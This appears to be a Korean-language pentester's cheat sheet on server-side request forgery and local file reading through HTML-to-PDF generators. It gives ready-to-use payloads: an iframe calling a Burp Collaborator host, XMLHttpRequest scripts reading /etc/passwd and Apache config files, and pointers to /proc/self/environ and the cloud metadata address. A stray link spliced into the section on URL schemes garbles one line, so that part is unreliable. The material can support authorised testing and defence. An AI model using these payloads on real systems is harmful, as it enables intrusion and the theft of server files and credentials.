# 12_SSRF_문서생성기

PDF/문서 생성기가 사용자 입력값을 검증 없이 HTML/JS로 해석할 때 발생하는 취약점 클래스. HTML 인젠션 → JS 실행 확인 → SSRF/로컬파일읽기 순으로 확장된다.

---

## 탐지 대상

이력서 발급, 주문확인서, 송장반부/배송조회 PDF 다운로드, 보고서 생성 기능이 있는 앱은 모두 후보다. 내부적으로 wkhtmltopdf, Puppeteer/Headless Chrome, DomPDF, TCPDF 같은 라이브러리를 쓰는 경우가 많음.

---

## 1단계: HTML 인젠션 확인

```html
<h1>test</h1>
```

숫자만 받을 것 같은 필드에 HTML 태그를 넣어보고, 생성된 PDF/문서에 그대로 렌더링되는지 확인한다. 렌더링되면 다음 단계로.

---

## 2단계: JS 실행 확인

```html
<script>document.write('TESTING')</script>
```

결과물에 "TESTING"이라는 실행 결과만 나오면(태그 그대로가 아니라) 이 엔진이 JS를 진짜로 실행하고 있다는 뜻. 다음으로 SSRF/로컬파일읽기 시도.

---

## 3단계: SSRF 확인 (외부 요청 유도)

```html
<iframe src="http://<Burp Collaborator 주소>"></iframe>
```

PDF 다운로드 직후 Collaborator에 히트가 오면 SSRF 확정. 다만 iframe으로는 보통 로컬 파일 읽기까지는 안 되는 경우가 많아, 다음 단계(XHR)로 넘어가야 함.

---

## 4단계: XMLHttpRequest로 로컬 파일 읽기 (핵심 기법)

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

`file://` 프로토콜은 브라우저(정확히는 PDF 렌더러 안의 브라우저 엔진)가 지원하는 표준 스키마라서, 같은 출처 정책(same-origin policy)이 문서 내부 컨텍스트에서는 느슨하게 적용되는 경우가 많아 로컬 파일 읽기가 되는 경우가 흔함.

---

## 5단계: 실제 경로를 모를 때 — 서버 설정 파일부터 읽기

애플리케이션 구조를 추측하기 전에, 웹서버 설정 파일로 실제 경로를 먼저 확인한다.

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/apache2/sites-enabled/000-default.conf");
x.send();
</script>
```

`DocumentRoot` 값을 보고 웹 루트 경로를 확정한 다음, 그 경로 기준으로 다른 파일(애플리케이션 소스, 설정파일)을 읽는다.

---

## 도구 한계 (주의할 것)

- 디렉토리 리스팅이 XHR로는 안 된다 — `file:///some/dir/`로 요청하면 응답이 빈 경우가 많음, 파일명을 정확히 알아야 함
- `php://` 같은 서버측 전용 스키마는 브라우저에서 안 먹힌다 — XHR은 [https://app.notion.com](https://app.notion.com), http(s):// 같은 브라우저 표준 스키마만 이해하고, php://filter 다루는 PHP 코드 내부에서만 쓰는 것이라 혼동하지 않을 것
- `/proc/self/environ`, `/proc/self/cmdline` 같은 프로세스 자체 정보 노출 파일로 스크립트 자체 경로를 역추적해볼 수 있으나, 권한/샘박스 설정에 따라 응답이 비어서 안 될 수도 있음

---

## 레더링 엔진별 참고사항

- wkhtmltopdf: `--disable-local-file-access` 옵션이 설정되어 있으면 로컬 파일 접근 자체가 막혀있을 수 있음 — 이 경우 내부망/클라우드 메타데이터로 SSRF만 시도
- 비동기 생성 구조(작업 큐 방식)를 쓰는 서비스는 클라우드 서버리스 자원을 쓰는 경우가 많아, 클라우드 메타데이터 엔드포인트(169.254.169.254)를 함께 노려볼 가치가 있음

---

## 팁

- 보고서/영수증/송장 같은 PDF 다운로드 기능이 있는 곳은 전부 HTML 인젠션부터 시도해볼 가치 있음
- 응답에 아무것도 안 나오면(500/502 에러) 자체가 파일을 실행하려고 시도했다는 신호일 수 있음 — 다른 확장자/경로로 재시도
- 감으로 애플리케이션 구조를 추측하기 전에, 웹서버 설정 파일로 실제 DocumentRoot부터 확인하는 것이 시간을 아낌